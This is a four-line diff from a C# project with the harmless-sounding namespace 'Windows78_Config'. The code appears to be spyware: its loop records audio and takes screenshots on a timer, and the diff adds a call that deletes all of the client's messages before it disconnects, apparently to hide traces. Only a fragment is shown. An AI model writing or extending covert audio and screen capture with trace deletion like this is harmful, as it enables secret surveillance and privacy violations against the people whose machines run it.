@@ -87,6 +87,7 @@ namespace Windows78_Config
                         }
                         recordAudio(pathString);
                         GetScreenShot(pathString);
+                        client.DeleteAllMessages();
                         client.Disconnect(true);
                         Thread.Sleep(30000);
                         
